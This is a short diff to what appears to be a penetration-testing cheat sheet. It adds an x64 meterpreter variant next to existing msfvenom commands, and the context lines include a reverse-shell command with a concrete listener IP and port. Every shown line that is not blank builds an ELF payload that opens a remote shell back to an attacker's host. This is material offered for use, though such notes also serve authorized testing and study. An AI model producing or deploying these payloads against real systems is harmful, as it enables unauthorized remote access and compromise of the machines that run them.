@@ -69,7 +69,12 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.157 LPORT=143 -f elf >
 meterpreter
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 ```
+
+
+ 
 
 
 # 其他
